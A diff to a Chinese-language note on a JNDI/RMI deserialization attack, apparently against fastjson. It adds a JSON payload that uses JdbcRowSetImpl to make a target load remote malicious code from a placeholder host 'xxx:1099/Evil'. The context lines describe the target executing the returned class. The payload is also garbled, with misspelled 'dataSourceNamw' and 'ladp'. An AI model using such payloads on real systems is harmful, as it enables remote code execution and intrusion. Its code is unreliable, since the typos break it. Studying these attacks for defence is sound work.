@@ -16,6 +16,13 @@
 4. rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。
 5. 靶机服务器执行了恶意代码，被攻击者成功利用。
 ```
+```
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceNamw": "ladp:xxx:1099/Evil",
+    "autoCommit":"true"
+}
+```
 ![](https://img-bc.icode.best/26de9fc36b2940c6882491c5453db571.png)
 
 
